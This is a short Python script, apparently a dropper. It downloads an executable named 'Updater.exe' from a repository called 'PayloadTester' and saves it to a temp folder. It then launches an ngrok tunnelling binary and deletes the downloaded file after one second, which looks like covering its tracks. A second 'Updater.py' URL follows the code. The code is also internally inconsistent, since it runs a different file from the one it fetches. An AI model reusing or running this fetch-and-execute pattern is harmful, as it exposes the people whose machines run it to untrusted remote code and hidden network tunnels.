import requests, subprocess, os, threading

# To save to a relative path.
r = requests.get('https://github.com/DJOCKER-FACE/PayloadTester/blob/master/Updater.exe?raw=true')
with open('temp/Updater.exe', 'wb') as f:
    f.write(r.content)

subprocess.call(['temp/ngrok.exe'])




def all_done():
    os.remove('temp/Updater.exe')


timer = threading.Timer(1.0, all_done)
timer.start()

print("Exit\n")


https://github.io/DJOCKER-FACE/allupdatemyfiles/raw/master/Updater.py